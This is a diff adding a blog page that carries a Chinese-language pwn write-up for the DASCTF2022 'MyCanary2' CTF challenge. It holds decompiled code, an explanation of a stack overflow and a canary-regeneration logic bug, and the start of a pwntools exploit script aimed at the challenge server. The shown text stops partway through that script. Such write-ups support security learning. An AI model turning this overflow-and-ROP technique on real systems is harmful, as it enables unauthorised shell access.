@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="false" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>DASCTF2022七月赋能赛 MyCanary2 | Silence to hear.</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="Analyse  sub_4012B6()  unsigned int sub_4012B6() &amp;#123;   int v0; &#x2F;&#x2F; eax   int fd; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]    setbuf(stdin, 0LL);   setbuf(stdout, 0LL);   setbuf(stderr, 0LL);   fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF2022七月赋能赛 MyCanary2">
+<meta property="og:url" content="http://mykonos-x.github.io/2022/07/28/DASCTF2022%E4%B8%83%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9B-MyCanary2/index.html">
+<meta property="og:site_name" content="Silence to hear.">
+<meta property="og:description" content="Analyse  sub_4012B6()  unsigned int sub_4012B6() &amp;#123;   int v0; &#x2F;&#x2F; eax   int fd; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]    setbuf(stdin, 0LL);   setbuf(stdout, 0LL);   setbuf(stderr, 0LL);   fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;,">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-27T17:20:00.000Z">
+<meta property="article:modified_time" content="2023-09-05T17:28:17.812Z">
+<meta property="article:author" content="ymepetb">
+<meta property="article:tag" content="write-up">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Silence to hear." type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Silence to hear. </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Your Name </div>
+      <div class="dot"></div>
+      <div class="subtitle">This is the subtitle </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/tips/">
+                tips
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/basic/">
+                basic
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/CTF-Challenges-Replicated/">
+                CTF Challenges Replicated
+                <div class="category-count">2</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gin/" rel="tag">Gin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Solutions/" rel="tag">Solutions</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/android-development/" rel="tag">android development</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dsa/" rel="tag">dsa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/openEuler/" rel="tag">openEuler</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rsa/" rel="tag">rsa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/scripts/" rel="tag">scripts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/solutions/" rel="tag">solutions</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/write-up/" rel="tag">write-up</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-DASCTF2022七月赋能赛-MyCanary2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        DASCTF2022七月赋能赛 MyCanary2
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2022-07-27T17:20:00.000Z" itemprop="datePublished">2022-07-28</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+             words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/write-up/" rel="tag">write-up</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h3><span id="analyse">Analyse</span></h3>
+<ul class="lvl-0">
+<li class="lvl-2">sub_4012B6()</li>
+</ul>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">sub_4012B6</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"can't open /dev/urandom"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>qword_4040D0<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">srand</span><span class="token punctuation">(</span>v0 <span class="token operator">^</span> qword_4040D0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里通过time()时间戳和<code>qword_4040D0</code>作为seed，进行一个随机数的生成</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>sub_4013EC()</p>
+</li>
+</ul>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_4013EC</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-70h] BYREF</span>
+  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-18h]</span>
+  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+6Ch] [rbp-4h]</span>
+
+  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  qword_4040D0 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span>
+  qword_4040D0 <span class="token operator">+=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v2 <span class="token operator">=</span> qword_4040D0<span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I have a secret. Can you find it?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v4 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">sub_401381</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    v3 <span class="token operator">=</span> <span class="token function">READ</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"My secret is %016lx\n"</span><span class="token punctuation">,</span> qword_4040D0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        qword_4040D0 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span>
+        qword_4040D0 <span class="token operator">+=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        v2 <span class="token operator">=</span> qword_4040D0<span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"But now, I have a new Secret."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
+        v4 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Show me the code:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  result <span class="token operator">=</span> qword_4040D0<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">!=</span> qword_4040D0 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hey, What are you doing?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>case2:输出<code>qword_4040D0</code>，并且将rand()生成的随机数值左移运算32后赋给<code>qword_4040D0</code>，接着再加上一个随机数值，将<code>qword_4040D0</code>赋给v2，这个v2就起到一个canary的作用</p>
+<p>case1:stackoverflow</p>
+<p>程序退出前检查v2的值是否被改动过，如果与之前不等，则crash掉</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401573</span> <span class="token punctuation">;</span> __unwind <span class="token punctuation">&#123;</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401573</span>                 endbr64
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401577</span>                 push    rbp
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401578</span>                 mov     rbp<span class="token punctuation">,</span> rsp
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040157</span>B                 lea     rdi<span class="token punctuation">,</span> aBinSh     <span class="token punctuation">;</span> <span class="token string">"/bin/sh"</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401582</span>                 call    _system
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401587</span>                 nop
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401588</span>                 pop     rbp
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401589</span>                 retn
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401589</span> <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 401573</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>程序有后门函数，我们可以利用<code>/bin/sh</code></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">-</span><span class="token number">0000000000000070</span> buf             db <span class="token number">88</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>
+<span class="token operator">-</span><span class="token number">0000000000000018</span> anonymous_0     dq <span class="token operator">?</span>              <span class="token comment">//v2</span>
+<span class="token operator">-</span><span class="token number">0000000000000010</span>                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">000000000000000F</span>                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">000000000000000</span>E                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">000000000000000</span>D                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">000000000000000</span>C                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">000000000000000</span>B                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">000000000000000</span>A                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">0000000000000009</span>                 db <span class="token operator">?</span> <span class="token punctuation">;</span> undefined
+<span class="token operator">-</span><span class="token number">0000000000000008</span> var_8           dd <span class="token operator">?</span>             <span class="token comment">//v4</span>
+<span class="token operator">-</span><span class="token number">0000000000000004</span> var_4           dd <span class="token operator">?</span>
+<span class="token operator">+</span><span class="token number">0000000000000000</span>  s              db <span class="token number">8</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>
+<span class="token operator">+</span><span class="token number">0000000000000008</span>  r              db <span class="token number">8</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>栈的一个分布，v2在buf的下方，我们在利用stackoverflow的时候会将v2覆盖掉，这样退出程序必然会crash</p>
+<p>逻辑漏洞：如果我们先利用stackoverflow漏洞，ROP，调用system，构造system(“/bin/sh”)，再采用case2来生成canary，<code>qword_4040D0</code>的值会被赋给v2，这样虽然刚才v2被覆盖掉，但是现在已经是新生成的canary的值了，退出程序不会crash</p>
+<p><s>刚拿到这道题的时候我在预测canary的值，没想到这么简单</s></p>
+<h3><span id="exp">exp</span></h3>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+'''</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> ctypes
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span> <span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span> <span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
+elf_path <span class="token operator">=</span> <span class="token string">"/mnt/c/Users/M1sceden4/Desktop/MyCanary2/tempdir/PWN附件/MyCanary2"</span>
+libc_func <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"0 for remote , 1 for local:\t"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+host <span class="token operator">=</span> <span class="token string">"node4.buuoj.cn"</span>
+port <span class="token operator">=</span> <span class="token number">28118</span>
+<span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+    io <span class="token operator">=</span> process<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
+<span class="token keyword">elif</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+    io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host <span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+pop_rdi <span class="token operator">=</span> <span class="token number">0x401613</span>
+ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
+<span class="token comment"># io.recvuntil("Input your choice\n")</span>
+<span class="token comment"># io.sendline("2")</span>
+<span class="token comment"># io.recvuntil("My secret is ")</span>
+<span class="token comment"># qword_4040D0 = (io.recv(16)).decode()</span>
+
+
+<span class="token comment"># success("get qword_4040D0 : %s" % qword_4040D0)</span>
